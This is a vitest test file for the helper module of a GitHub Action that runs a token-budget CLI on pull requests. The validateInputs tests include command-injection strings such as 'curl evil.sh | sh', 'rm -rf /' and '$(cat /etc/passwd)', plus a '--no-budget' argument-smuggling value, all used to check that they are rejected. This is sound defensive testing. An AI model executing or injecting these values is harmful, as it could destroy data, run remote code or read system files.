import { describe, it, expect } from 'vitest';
import {
  classifyExclusions,
  decideFits,
  buildArgs,
  formatStepSummary,
  resolveBase,
  validateReport,
  validateInputs,
} from '../src/classify.mjs';

describe('classifyExclusions', () => {
  it('splits budget-driven reasons from other reasons', () => {
    const excluded = [
      { path: 'a.ts', reason: 'exceeds-budget' },
      { path: 'b.ts', reason: 'exceeds-budget-after-compression' },
      { path: 'c.ts', reason: 'below-candidate-cut' },
      { path: 'd.ts', reason: 'binary' },
      { path: 'e.ts', reason: 'ignored' },
      { path: 'f.ts', reason: 'secret-detected' },
      { path: 'g.ts', reason: 'not-found' },
      { path: 'h.ts', reason: 'outside-root' },
    ];
    const result = classifyExclusions(excluded);
    expect(result.budgetDriven.map(e => e.path)).toEqual(['a.ts', 'b.ts', 'c.ts']);
    expect(result.other.map(e => e.path)).toEqual(['d.ts', 'e.ts', 'f.ts', 'g.ts', 'h.ts']);
  });

  it('returns empty arrays for an empty input', () => {
    const result = classifyExclusions([]);
    expect(result.budgetDriven).toEqual([]);
    expect(result.other).toEqual([]);
  });
});

describe('decideFits', () => {
  it('is true when there are no budget-driven exclusions', () => {
    expect(decideFits({ budgetDriven: [], other: [{ path: 'x', reason: 'binary' }] })).toBe(true);
  });

  it('is false when there is at least one budget-driven exclusion', () => {
    expect(decideFits({ budgetDriven: [{ path: 'x', reason: 'exceeds-budget' }], other: [] })).toBe(false);
  });
});

describe('buildArgs', () => {
  it('always includes --pr --explain --format json', () => {
    const args = buildArgs({ path: '.', budget: '', model: '', base: '' });
    expect(args).toContain('--pr');
    expect(args).toContain('--explain');
    expect(args[args.indexOf('--format') + 1]).toBe('json');
  });

  it('omits --budget/--model/--base when unset', () => {
    const args = buildArgs({ path: '.', budget: '', model: '', base: '' });
    expect(args).not.toContain('--budget');
    expect(args).not.toContain('--model');
    expect(args).not.toContain('--base');
  });

  it('includes --budget when set', () => {
    const args = buildArgs({ path: '.', budget: '50000', model: '', base: '' });
    expect(args[args.indexOf('--budget') + 1]).toBe('50000');
  });

  it('includes --model when set', () => {
    const args = buildArgs({ path: '.', budget: '', model: 'claude-opus-5', base: '' });
    expect(args[args.indexOf('--model') + 1]).toBe('claude-opus-5');
  });

  it('includes --base when set', () => {
    const args = buildArgs({ path: '.', budget: '', model: '', base: 'main' });
    expect(args[args.indexOf('--base') + 1]).toBe('main');
  });

  it('puts path as the first argument', () => {
    const args = buildArgs({ path: 'my-repo', budget: '', model: '', base: '' });
    expect(args[0]).toBe('my-repo');
  });
});

describe('formatStepSummary', () => {
  const passingReport = {
    summary: { totalTokens: 4200, included: 3, excluded: 0, byCompressionLevel: {} },
    budget: { maxTokens: 50000, effective: 50000 },
  };

  it('formats a one-line pass summary', () => {
    const classified = { budgetDriven: [], other: [] };
    const summary = formatStepSummary(passingReport, classified, true);
    expect(summary).toContain('passed');
    expect(summary).toContain('4,200');
  });

  it('formats a failing summary listing excluded files and reasons', () => {
    const failingReport = {
      summary: { totalTokens: 52000, included: 2, excluded: 1, byCompressionLevel: {} },
      budget: { maxTokens: 50000, effective: 50000 },
    };
    const classified = { budgetDriven: [{ path: 'src/big.ts', reason: 'exceeds-budget' }], other: [] };
    const summary = formatStepSummary(failingReport, classified, false);
    expect(summary).toContain('failed');
    expect(summary).toContain('src/big.ts');
    expect(summary).toContain('exceeds-budget');
  });

  it('caps the excluded file list at 20 with a remainder note', () => {
    const many = Array.from({ length: 25 }, (_, i) => ({ path: `file${i}.ts`, reason: 'exceeds-budget' }));
    const classified = { budgetDriven: many, other: [] };
    const summary = formatStepSummary(passingReport, classified, false);
    expect(summary).toContain('file19.ts');
    expect(summary).not.toContain('file20.ts');
    expect(summary).toContain('...and 5 more');
  });

  it('does not throw when a failing report is missing budget', () => {
    const reportWithoutBudget = {
      summary: { totalTokens: 52000, included: 2, excluded: 1, byCompressionLevel: {} },
    };
    const classified = { budgetDriven: [{ path: 'src/big.ts', reason: 'exceeds-budget' }], other: [] };
    const summary = formatStepSummary(reportWithoutBudget, classified, false);
    expect(summary).toContain('failed');
    expect(summary).toContain('52,000');
    expect(summary).not.toContain('undefined');
  });
});

describe('resolveBase', () => {
  it('returns an explicit base unchanged without consulting git', () => {
    const seen = [];
    const refExists = ref => {
      seen.push(ref);
      return true;
    };
    expect(resolveBase('release/1.x', 'main', refExists)).toBe('release/1.x');
    expect(seen).toEqual([]);
  });

  it('returns an empty string when there is no explicit base and no env ref', () => {
    expect(resolveBase('', '', () => true)).toBe('');
    expect(resolveBase('', undefined, () => true)).toBe('');
  });

  it('prefers the origin-prefixed ref, which is the only one actions/checkout creates', () => {
    // Reproduces the real pull_request layout: the base branch exists only as
    // refs/remotes/origin/main, so a bare `main` would fail `git merge-base`.
    const refExists = ref => ref === 'origin/main';
    expect(resolveBase('', 'main', refExists)).toBe('origin/main');
  });

  it('falls back to the bare ref when no origin-prefixed ref exists', () => {
    const refExists = ref => ref === 'develop';
    expect(resolveBase('', 'develop', refExists)).toBe('develop');
  });

  it('returns an empty string when neither candidate resolves', () => {
    expect(resolveBase('', 'main', () => false)).toBe('');
  });

  it('checks the origin-prefixed candidate before the bare one', () => {
    const seen = [];
    resolveBase('', 'main', ref => {
      seen.push(ref);
      return false;
    });
    expect(seen).toEqual(['origin/main', 'main']);
  });
});

describe('validateReport', () => {
  const validReport = {
    excluded: [{ path: 'a.ts', reason: 'exceeds-budget' }],
    summary: { totalTokens: 4200, included: 3, excluded: 1, byCompressionLevel: {} },
    budget: { maxTokens: 50000, effective: 50000 },
  };

  it('accepts a well-formed report', () => {
    expect(validateReport(validReport)).toBeNull();
  });

  it('accepts a report with an empty excluded list', () => {
    expect(validateReport({ ...validReport, excluded: [] })).toBeNull();
  });

  it('rejects null and non-objects', () => {
    expect(validateReport(null)).toMatch(/object/);
    expect(validateReport('nope')).toMatch(/object/);
    expect(validateReport(42)).toMatch(/object/);
  });

  it('rejects a missing or non-array excluded', () => {
    expect(validateReport({ summary: { totalTokens: 1 } })).toMatch(/excluded/);
    expect(validateReport({ ...validReport, excluded: 'nope' })).toMatch(/excluded/);
  });

  it('rejects a missing summary', () => {
    expect(validateReport({ excluded: [] })).toMatch(/summary/);
    expect(validateReport({ excluded: [], summary: null })).toMatch(/summary/);
  });

  it('rejects a missing or non-numeric summary.totalTokens', () => {
    expect(validateReport({ excluded: [], summary: {} })).toMatch(/totalTokens/);
    expect(validateReport({ excluded: [], summary: { totalTokens: '4200' } })).toMatch(/totalTokens/);
  });
});

describe('validateInputs', () => {
  const valid = {
    path: '.',
    budget: '100k',
    model: 'claude-opus-5',
    base: 'main',
    repocodeVersion: 'latest',
  };

  it('accepts a fully populated, realistic set of inputs', () => {
    expect(validateInputs(valid)).toBeNull();
  });

  it('accepts inputs with every optional field unset', () => {
    expect(validateInputs({ path: '.', budget: '', model: '', base: '', repocodeVersion: '' })).toBeNull();
  });

  it('accepts realistic legitimate values for the free-form fields', () => {
    expect(validateInputs({ ...valid, base: 'release/2.0.x' })).toBeNull();
    expect(validateInputs({ ...valid, base: 'feature/gh-action_budget-check' })).toBeNull();
    expect(validateInputs({ ...valid, path: 'packages/core' })).toBeNull();
    expect(validateInputs({ ...valid, model: 'gpt-4.1-mini' })).toBeNull();
  });

  it('accepts the budget formats the CLI itself accepts', () => {
    for (const budget of ['1', '50000', '100k', '100K', '2m', '2M']) {
      expect(validateInputs({ ...valid, budget })).toBeNull();
    }
  });

  it('rejects a budget that is not digits with an optional k/m suffix', () => {
    expect(validateInputs({ ...valid, budget: 'lots' })).toMatch(/budget/);
    expect(validateInputs({ ...valid, budget: '100kb' })).toMatch(/budget/);
    expect(validateInputs({ ...valid, budget: '100k; rm -rf /' })).toMatch(/budget/);
  });

  it('accepts real npm versions and dist-tags for repocode-version', () => {
    for (const repocodeVersion of ['latest', 'next', '0.3.0', '1.0.0-beta.1', '2.0.0+build.5']) {
      expect(validateInputs({ ...valid, repocodeVersion })).toBeNull();
    }
  });

  it('rejects a repocode-version containing shell syntax', () => {
    expect(validateInputs({ ...valid, repocodeVersion: 'latest && curl evil.sh | sh' })).toMatch(/repocode-version/);
    expect(validateInputs({ ...valid, repocodeVersion: '$(id)' })).toMatch(/repocode-version/);
  });

  it('rejects a base branch carrying a shell command', () => {
    // The realistic vector: a workflow wiring `base: ${{ github.head_ref }}` from an
    // untrusted PR, spawned under shell: true on Windows where Node does no quoting.
    expect(validateInputs({ ...valid, base: 'main; rm -rf /' })).toMatch(/base/);
    expect(validateInputs({ ...valid, base: 'main`whoami`' })).toMatch(/base/);
    expect(validateInputs({ ...valid, base: 'main\ncurl evil.sh | sh' })).toMatch(/base/);
  });

  it('rejects a value that injects an extra CLI argument via a plain space', () => {
    // Under shell: true on Windows, Node concatenates argv into one unquoted command string
    // and cmd.exe re-tokenizes on whitespace. `main --no-budget` contains no other blocked
    // character but would still split into two CLI arguments, letting Commander apply
    // `--no-budget` last and silently disable the budget check.
    expect(validateInputs({ ...valid, base: 'main --no-budget' })).toMatch(/base/);
    expect(validateInputs({ ...valid, model: 'claude-opus-5 --no-budget' })).toMatch(/model/);
  });

  it('rejects a model containing shell metacharacters', () => {
    expect(validateInputs({ ...valid, model: 'claude & calc' })).toMatch(/model/);
    expect(validateInputs({ ...valid, model: '$(cat /etc/passwd)' })).toMatch(/model/);
  });

  it('rejects a path containing shell metacharacters', () => {
    expect(validateInputs({ ...valid, path: '. && curl evil.sh | sh' })).toMatch(/path/);
    expect(validateInputs({ ...valid, path: '.;id' })).toMatch(/path/);
  });

  it('names the offending input in the message', () => {
    expect(validateInputs({ ...valid, base: 'main; id' })).toContain('base');
    expect(validateInputs({ ...valid, model: 'x; id' })).toContain('model');
    expect(validateInputs({ ...valid, path: 'x; id' })).toContain('path');
  });
});
